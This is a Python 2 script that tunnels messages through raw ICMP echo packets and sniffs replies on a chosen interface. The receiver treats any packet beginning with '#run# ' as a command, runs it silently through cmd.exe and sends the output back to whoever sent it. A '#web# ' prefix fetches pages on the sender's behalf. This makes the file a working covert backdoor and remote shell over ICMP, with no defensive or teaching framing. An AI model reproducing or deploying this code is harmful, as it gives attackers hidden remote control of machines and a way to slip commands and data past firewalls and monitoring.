import socket
import struct
import sys
import threading
import random
import os
import select
import subprocess
import urllib2

def get_webpage(url):
	f = open("bla.html","w")
	f.write(urllib2.urlopen(url).read())
	f.close()
	return urllib2.urlopen(url).read()

def run_cmd(command):
	proc = subprocess.Popen('cmd.exe', stdin = subprocess.PIPE, stdout = subprocess.PIPE)
	stdout, stderr = proc.communicate(command+'\n')
	return stdout

def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2

    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff

    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)

    return answer

def send_message(inputData):
	global control
	splitted = inputData.split(' ', 1)
	
	dest = socket.gethostbyname(splitted[0]) #destination IP addr
	
	all_message = splitted[1]#.encode("utf-8") #encoded message
	a = 0
	b = len(all_message) // 930
	c = control
	control += 1
	control %= 10
	for i in range(0,len(all_message),930):
		message = "\\" + str(a) + "\\" + str(b) + "\\" + str(c) +"\\"+ all_message[i:min(len(all_message),i+930)]#
		a += 1
		
		my_checksum = 0
		
		id = random.randint(1, 0xffff)
		# Header is type (8), code (8), checksum (16), id (16), sequence (16)
		header = struct.pack("bbHHh", 8, 0, my_checksum, id, 1)
		my_checksum = checksum(header + message)
		
		header = struct.pack("bbHHh", 8, 0, socket.htons(my_checksum), id, 1)
		packet = header + message
		#open socket
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))

		#bind to public interface (ip, port) and send packet
		s.bind((INTERFACE, 0)) 
		s.sendto(str(packet), (dest, 1))
	

def receive_message(sniffer):
	whatReady = select.select([sniffer], [], [], 2)
	recPacket, addr = sniffer.recvfrom(1024)
	icmpHeader = recPacket[20:28]
	icmpData = recPacket[28:]
	type, code, checksum, packetID, sequence = struct.unpack("bbHHh", icmpHeader)
	
	#filter out our own packets
	if(addr[0] == INTERFACE): 
		return ""
	
	if(type == 0):
		type = "Reply"
	elif(type == 8):
		type = "Request"
	else:
		type = "Unknown("+type+")"
	msgData = icmpData#.decode("utf-8")
	if msgData[0] != '\\':
		return ""
	a, b, c, msgData = msgData[1:].split("\\", 3)
	a = int(a)
	b = int(b)
	c = int(c)
	
	if (addr[0] in messages):
		if (messages[addr[0]][1] != b or messages[addr[0]][3] != c):
			del messages[addr[0]]
	if (addr[0] not in messages):
		msg = []
		for i in range(0, b + 1):
			msg.append(" ")
		messages[addr[0]] = [msg,b,-1,c]
	messages[addr[0]][0][a] = msgData
	messages[addr[0]][2] += 1
	if messages[addr[0]][1] > messages[addr[0]][2]:
		return ""
	
	msgData = ""
	for i in messages[addr[0]][0]:
		msgData = msgData + i
	del messages[addr[0]]
	
	if len(msgData) > 5 and msgData[:6] == "#run# ":
		output = run_cmd(msgData[6:])
		send_message(addr[0]+ " " + output)
	
	if len(msgData) > 5 and msgData[:6] == "#web# ":
		webPage = get_webpage(msgData[6:])
		send_message(addr[0]+ " #save# " + msgData[6:] + "/\\" + webPage)
	
	if len(msgData) > 6 and msgData[:7] == "#save# ":
		name, webpage = msgData[7:].split("/\\", 1)
		f = open("web.html", 'w')
		f.write(webpage)
		f.close()
		return ""

	message = "[" + addr[0] + "] [" + type + "]: " + msgData
	return message


def message_receiver():
	#open socket and bind it to our interface
	sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
	sniffer.bind((INTERFACE, 0))
	
	#capture headers too
	sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

	#on WinOS we need to enable promisc mode
	if os.name == "nt":
		sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

	while True:
		msg_received = receive_message(sniffer)
		if len(msg_received) > 0: # ce obstaja sporocilo
			print("[Received] " + msg_received) # izpisi


if __name__ == "__main__":
	control = 0
	
	global messages
	messages = dict()

	global INTERFACE
	INTERFACE = "192.168.1.12" #default interface, used if input empty

	newIface = raw_input("Enter interface ip: ")
	if(len(newIface) > 0):
		INTERFACE = newIface
	
	#start listening on interface
	thread = threading.Thread(target=message_receiver)
	thread.daemon = True
	thread.start()

	#send message (format: "<destination> <message>")
	while True:
		try:
			msg_send = raw_input()
			send_message(msg_send)
		except KeyboardInterrupt:
			sys.exit()
